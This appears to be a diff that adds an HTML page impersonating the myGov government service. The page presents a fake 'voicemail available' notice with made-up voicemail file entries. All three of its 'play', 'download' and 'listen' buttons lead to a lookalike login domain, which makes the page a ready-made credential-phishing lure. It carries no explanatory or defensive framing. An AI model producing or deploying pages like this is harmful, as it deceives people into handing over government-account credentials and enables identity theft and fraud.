@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fax Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f9f9f9;
+        }
+
+        .container {
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        h1 .icon {
+            font-size: 1.5rem;
+        }
+
+        .subtitle {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .description {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .document-list {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .document-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            background: #fff;
+        }
+
+        .file-icon img {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+
+        .file-name {
+            flex-grow: 1;
+            margin-right: 10px;
+        }
+
+        .file-size {
+            margin-right: 10px;
+        }
+
+        .dropdown {
+            color: #888;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .button {
+            padding: 10px 20px;
+            font-size: 0.9rem;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .button.view-pdf {
+            background-color: #007bff;
+        }
+
+        .button.download-pdf {
+            background-color: #004085;
+        }
+
+        .button.listen {
+            background-color: #28a745;
+        }
+
+        .button:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>myGov<span class="icon">📠</span></h1>
+        <p class="subtitle">Voicemail Available</p>
+        <p class="description">You have urgents voicemail(s) to retrieve. Please click the link below to access or listen:</p>
+        <div class="document-list">
+            <div class="document-item"><span class="file-icon"><img src="https://img.icons8.com/ios-filled/50/null/voicemail.png" alt="Voicemail Icon"></span> <span class="file-name">100041003_SO_A155505IN_2...</span> <span class="file-size">104 KB</span> <span class="dropdown">▼</span></div>
+            <div class="document-item"><span class="file-icon"><img src="https://img.icons8.com/ios-filled/50/null/voicemail.png" alt="Voicemail Icon"></span> <span class="file-name">WO-00376841.mp3</span> <span class="file-size">179 KB</span> <span class="dropdown">▼</span></div>
+        </div>
+        <div class="buttons"><a href="https://login.lampdncolivpor.website/dlgnRFnc" class="button view-pdf" target="_blank" rel="noopener noreferrer">PLAY-mp3 ▶</a> <a href="https://login.lampdncolivpor.website/dlgnRFnc" class="button download-pdf" download="">PLAY ⬇</a> <a href="https://login.lampdncolivpor.website/dlgnRFnc" class="button listen" target="_blank" rel="noopener noreferrer">Listen 🎧</a></div>
+    </div>
+</body>
+
+</html>
